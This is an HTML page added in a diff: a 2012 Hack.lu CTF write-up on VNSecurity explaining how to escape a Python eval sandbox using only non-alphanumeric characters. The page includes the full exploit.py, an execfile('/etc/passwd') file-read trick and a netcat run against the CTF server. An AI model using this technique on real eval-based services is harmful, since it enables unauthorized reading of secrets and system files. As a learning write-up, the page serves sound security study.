@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width initial-scale=1">
+
+  <title>[writeup] Hacklu 2012 – Challenge #13 &#8211; The Sandbox Terminal</title>
+  <meta name="description" content="Solved by w00d @ clgt***Thanks **g4mm4 for giving many suggestions and draft the first version of the exploit*">
+  <link rel="stylesheet" href="/assets/bootstrap.css">
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:8000/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-13.html">
+  <link rel="alternate" type="application/atom+xml" title="VNSecurity" href="http://localhost:8000/feed.xml" />
+  <script type="text/javascript" src='//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js?ver=3.9.2'></script>
+  <script type="text/javascript" src="/assets/jquery.js"></script>
+  <script type="text/javascript" src="/assets/jquery.caroufredsel-6.0.4-packed.js"></script>
+  <script type="text/javascript">
+    // WebFont.load({
+    //     google: {
+    //         families: ['Source+Sans+Pro','Open+Sans::latin,vietnamese']
+    //     }
+    // });
+  </script>
+</head>
+
+    <body>
+        <div class="wrapper kopa-shadow">
+            <div class="row-fluid">
+                <header id="page-header">
+    <div class="clearfix" id="header-top">
+
+        <div class="kp-headline-wrapper clearfix">
+            <h6 class="kp-headline-title">Breaking news<span></span></h6>
+            <div class="kp-headline clearfix">
+                <dl class="ticker-1 clearfix">
+                    
+                    <dd>
+                        <a href="/headlines/2014/05/06/btalk-part-1.html">Phân tích ứng dụng Btalk trên Android &#8211; Phần một: Cơ chế xác thực người dùng</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html">Học viện SANS đến Việt Nam 03/2012</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/16/hoi-thao-tet-2012.html">Hội thảo Tết 2012</a>
+                    </dd>
+                    
+                </dl><!--ticker-1-->
+            </div><!--kp-headline-->
+        </div><!--kp-headline-wrapper-->
+
+        <div class="social-search-box">
+
+        </div>
+        <!--social-search-box-->
+
+    </div>
+    <!--header-top-->
+
+    <div class="clearfix" id="header-middle">
+        <div id="logo-image">
+            <a href="http://vnsec-new.cloudapp.net/wp">
+                <img width="217" height="70" alt="VNSecurity Logo" src="/assets/logo.png">
+            </a>
+        </div>
+        <div class="top-banner">
+
+
+        </div>
+        <!--top-banner-->
+
+    </div>
+
+    <!--header-middle-->
+
+    <div id="header-bottom">
+        <nav id="main-nav">
+            <ul class="menu clearfix sf-js-enabled sf-arrows" id="main-menu">
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/">Home</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/headlines/">headlines</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/tutorials/">tutorials</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/research/">research</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/ctf-clgt-crew/">ctf - clgt crew</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/misc/">misc</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/papers.html">Papers</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/tools.html">Tools</a>
+                </li>
+            </ul>
+        </nav>
+        <!--main-nav-->
+    </div>
+    <div>
+        
+    </div>
+    <!--header-bottom-->
+</header>
+                <div id="main-content">
+                    <div class="post type-post status-publish format-standard hentry category-tin-tuc tag-android tag-btalk tag-mobile entry-box clearfix">
+
+  <header class="post-header">
+    <h4 class="entry-title">[writeup] Hacklu 2012 – Challenge #13 &#8211; The Sandbox Terminal</h4>
+    <p class="post-meta">Oct 25, 2012 • w00d</p>
+  </header>
+
+  <article class="post-content">
+    <p><strong>Solved by w00d @ clgt<br />
+***Thanks **g4mm4</strong> for giving many suggestions and draft the first version of the exploit<br />
+*</p>
+
+<blockquote>
+  <p>13 – The Sandboxed Terminal (400)</p>
+
+  <p>Since the zombie apocalypse started people did not stop to ask themselves how the whole thing began. An abandoned military base may lead to answers but after infiltrating the facility you find yourself in front of a solid steel door with a computer attached. Luckily this terminal seems to connect to a Python service on a remote server to reduce load on the small computer. While your team managed to steal the source, they need your Python expertise to hack this service and get the masterkey which should be stored in a file called key.</p>
+
+  <p>https://ctf.fluxfingers.net:2076/c7238e81667a085963829e452223b47b/sandbox.py</p>
+</blockquote>
+
+<p>In this ctf, I bumped into a few python challenges. Though having been using it for a while, I’m still a novice and pretty much ill-prepared, it took me a lot of time to read articles about python security. There are many interesting ones which I might write in a separate blog, however they do not help me much to solve this challenge, the only thing they help is to keep me motivated.</p>
+
+<p>The python program consists of two parts:</p>
+
+<ul>
+  <li>First part is the Detangle class which basically make a “sandbox” environment:</li>
+</ul>
+
+<ol>
+  <li>You can not import anything.</li>
+  <li>You can neither use “open” nor “file” command.</li>
+  <li>It prints some nice debug information about what python command is executed and their arguments.</li>
+</ol>
+
+<ul>
+  <li>Second part allows you to input 3 params: num1, num2 and operator. There are two regular expressions to check your input:</li>
+</ul>
+
+<pre class="brush: plain; title: ; notranslate" title="">num_pattern = re.compile(r'^[d]{0,4}$')
+operator_pattern = re.compile(r'^[W]+$')
+...
+if not num_pattern.match(num1) or not num_pattern.match(num2):
+    raise SystemExit('Number rejected')
+if not operator_pattern.match(operator) or len(operator) &gt; 1900:
+    raise SystemExit('Operator rejected')
+</pre>
+
+<ol>
+  <li>num1, num2 should only be number, 4 digits at most.</li>
+  <li>operator should not contain any alphanumeric characters and its length must be at most 1900.</li>
+</ol>
+
+<p>These input will be fed into some eval command as follow:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">operator = eval(operator) if "'" in operator else operator
+print(eval(num1 + operator + num2))
+</pre>
+
+<p>For example, you can input “1″ , “2″ , “+”. The program will return “3″, simple as that.</p>
+
+<p>Obviously, if someone tells you to exploit this program, first is to look at “eval” (i.e. “evil”) and try to exploit that. But it’s a difficult task because you can’t bypass the two regular expressions and input any python code, recall that you can only input number or non-alphanumberic character.</p>
+
+<p>I tried several attempts and failed including some silly: trying to write a valid python code using unicode character, trying to overflow eval, trying to exploit Detangle, find a 0-day/1-day of re.match, ..<br />
+But failures teach you some lessons. I noticed that “operator” is eval-ed twice. That means after the first eval, we may be able to convert some non-alphanumberic character into python code and get it executed on the next one.</p>
+
+<p>I started with this gadget: s = <code>"(''=='')+(''=='')"</code>(inside are two single quotes). Run eval(s) in a python terminal will return you number “2″. Using this gadget/similar kind we typically can create any number. Progress: 25% !</p>
+
+<p>Now what about character ? It turned out that I can use backstick : ` ` as repr() which can give me some string that contains alpha-character, such as : <code>`(''=='')`</code> =&gt; “True”, <code>`(''!='')`</code> =&gt; “False”, moreover I can access each single character using square bracket : <code>`(''=='')`[1]</code> =&gt; ‘r’, or even better <code>`'xaa'`[3]</code> =&gt; ‘a’. We now can create any of these:** ‘abcdefxTruFls’**. Progress: 50% !</p>
+
+<p>I stopped looking at gadget, and started looking at how to bypass the Detangle class. It’s not hard as it look, though we can’t use “open” or “file” to open a file, can’t import anything, we can still use the built-in <strong>“execfile”</strong>. It does not allow us to run abitrary command but we can leak some info about the content of a file like this:</p>
+
+<blockquote>
+  <blockquote>
+    <blockquote>
+      <blockquote>
+        <p>execfile(“/etc/passwd”)<br />
+Traceback (most recent call last):<br />
+File “”, line 1, in<br />
+File “/etc/passwd”, line 1<br />
+root:x:0:0:root:/root:/bin/bash  </p>
+      </blockquote>
+    </blockquote>
+  </blockquote>
+  <p>SyntaxError: invalid syntax</p>
+</blockquote>
+
+<p>Progress: 75% !!!!! ** so excited **</p>
+
+<p>I need to read the file ‘key’ which makes the payload: “<strong>+execfile(‘key’)+</strong>“. As you can see, It contains “k”,”y”,”i” that is not in my “magic” list. Luckily the force is with me, 5 minutes after seeing this problem, I come up with this awesome gadget: <code>"%c"%(107)</code> =&gt; “k”. Any character can be generated using this gadget, however producing the number 107 can consume a lot of characters if done naively.</p>
+
+<p>The last thing is to make the payload as short as possible because the operator length is limited at 1900. Putting everything together, I am able to produce a 1650-bytes payload, far smaller than the limit! Now see how it work:</p>
+
+<blockquote>
+  <p>python exploit.py | nc ctf.fluxfingers.net 2060<br />
+…<br />
+Traceback (most recent call last):<br />
+File “./sandbox.py”, line 77, in<br />
+print(eval(num1 + operator + num2))<br />
+File “./sandbox.py”, line 45, in __call__<br />
+result = self.orig(*args, *<em>kwargs)<br />
+File “”, line 1, in<br />
+File “./sandbox.py”, line 45, in __call__<br />
+result = self.orig(*args, *</em>kwargs)<br />
+File “key”, line 1, in<br />
+dafuq_how_did_you_solve_this_nonalpha_thingy<br />
+NameError: name ‘dafuq_how_did_you_solve_this_nonalpha_thingy’ is not defined</p>
+</blockquote>
+
+<p>Mission accomplished ! Beer time =]</p>
+
+<p><strong>exploit.py</strong> source code:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">def makenumsmall(d):
+	gadget = "(''=='')"
+	rs = gadget
+
+	if (d==0): return rs+"-"+rs
+	if (d==1): return rs+"*"+rs
+
+	for i in range(1,d): rs += "+(''=='')"
+	return rs
+
+def makenum(d):
+	if (d&lt;5): return makenumsmall(d)
+	a = bin(d)[2:]
+	index = len(a) - 1
+	s = ""
+	for c in a:
+		if c == '1':
+			s+= "("+makenumsmall(1)+"&lt;&lt;"+makenumsmall(index)+")+"
+		index-=1
+	return s[0:-1]
+
+def makechar(line):
+	return "('%'+`'"+chr(0xcc)+"'`["+str(makenum(3))+"])["+str(makenum(0))+":"+str(makenum(4))+"]%(" + makenum(line) + ")"
+
+gd = {}
+
+gd['x'] = "`'"+chr(0xcc)+"'`["+makenum(2)+"]"
+gd['a'] = "`'"+chr(0xaa)+"'`["+makenum(3)+"]"
+gd['b'] = "`'"+chr(0xbb)+"'`["+makenum(3)+"]"
+gd['c'] = "`'"+chr(0xcc)+"'`["+makenum(3)+"]"
+gd['d'] = "`'"+chr(0xdd)+"'`["+makenum(3)+"]"
+gd['e'] = "`'"+chr(0xee)+"'`["+makenum(3)+"]"
+gd['f'] = "`'"+chr(0xff)+"'`["+makenum(3)+"]"
+
+a = "+execfile('key')+"
+solo = [ord(i) for i in a]
+#print solo
+_sum = ''
+import re
+for line in solo:
+	if chr(line) in gd:
+		_gad = gd[chr(line)]
+	elif chr(line) == "'":
+		_gad = "'\''"
+	elif re.match("W",chr(line)):
+		_gad = "'"+chr(line)+"'"
+	else:
+		_gad = makechar(line)
+	_sum += "+" + _gad
+
+_sum = _sum[1:]
+#print len(_sum)
+#print eval(eval(_sum))
+print "1n1n"+_sum
+</pre>
+
+  </article>
+
+</div>
+
+<hr/>
+<h2>Comments</h2>
+<div class="fb-comments" data-href="http://localhost:8000/ctf%20-%20clgt%20crew/2012/10/25/writeup-hacklu-2012-13.html" data-num-posts="4" data-width="706"></div>
+
+                </div>
+                <script type="text/javascript">
+jQuery(function() {
+    var _scroll = {
+        delay: 1000,
+        easing: 'linear',
+        items: 1,
+        duration: 0.07,
+        timeoutDuration: 0,
+        pauseOnHover: 'immediate'
+    };
+    jQuery('.ticker-1').carouFredSel({
+        width: 1000,
+        align: false,
+        items: {
+            width: 'variable',
+            height: 40,
+            visible: 1
+        },
+        scroll: _scroll
+    });
+
+    //  set carousels to be 100% wide
+    jQuery('.caroufredsel_wrapper').css('width', '100%');
+});
+</script>
+<script>
+  (function() {
+    var cx = '003844801333820630405:hlapfwpe2eq';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+        '//www.google.com/cse/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+<gcse:search></gcse:search>
+<footer class="site-footer">
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      
+    </div>
+
+  </div>
+
+</footer>
+
+            </div>
+        </div>
+        <script>(function(d, s, id) {
+          var js, fjs = d.getElementsByTagName(s)[0];
+          if (d.getElementById(id)) return;
+          js = d.createElement(s); js.id = id;
+          js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=671572696275219";
+          fjs.parentNode.insertBefore(js, fjs);
+        }(document, "script", "facebook-jssdk"));</script>
+    </body>
+</html>
